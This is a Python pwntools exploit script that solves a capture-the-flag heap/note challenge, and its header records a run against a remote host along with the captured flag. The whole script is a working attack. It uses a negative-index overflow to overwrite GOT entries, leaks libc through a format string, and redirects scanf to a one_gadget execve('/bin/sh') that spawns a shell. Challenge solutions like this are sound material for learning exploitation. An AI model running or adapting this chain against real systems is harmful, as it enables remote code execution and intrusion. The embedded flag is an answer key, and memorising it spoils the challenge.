#!/usr/bin/python3

"""
$ ./solve.py -r 146.148.28.103 32866
$ cat flag.txt
HNx04{83b55ee77f37cac314fe45d1f45e33f4}
"""

import argparse
from pwn import *

context.log_level = "error"
context.binary = ELF("./note_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

def add(index:bytes, value:bytes):
    p.sendline(b"1")
    p.recvuntil(b"idx: ")
    p.sendline(index)
    p.recvuntil(b"value: ")
    p.send(value)
    p.recvuntil(b">")

def view(index:bytes):
    p.sendline(b"2")
    p.recvuntil(b"idx: ")
    p.sendline(index)
    data = p.recvuntil(b"===").replace(b"===", b"").strip()
    p.recvuntil(b">")
    return data

parser = argparse.ArgumentParser()
exclusive = parser.add_mutually_exclusive_group()
exclusive.add_argument("-d", "--debug", action="store_true", help="run in debug mode")
exclusive.add_argument("-r", "--remote", nargs=2, metavar=("IP", "PORT"), help="run on given IP and port")
args = parser.parse_args()

if args.remote:
    ip = args.remote[0]
    port = int(args.remote[1])
    p = remote(ip, port)
elif args.debug:
    p = process()
    os.system(f"printf 'attach {p.pid}' | xclip -sel c")
    pause()
else:
    p = process()

# Overwriting puts got with printf's plt using an int overflow
p.recvuntil(b">")
add(b"-10", b"\xf0")

# Since puts now calls printf, using it to get a leak with a format string
add(b"0", b"%17$p")
leak = view(b"0")
libc.address = int(leak, 16) - (libc.sym["__libc_start_call_main"] + 122)
#print(f"Libc: {hex(libc.address)}")

"""
0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
"""
one_gadget = p64(libc.address + 0xef52b)

# Overwriting scanf's got with a one gadget
add(b"-7", b"A"*8+one_gadget[:7])
p.recvuntil(b" ")
p.interactive()
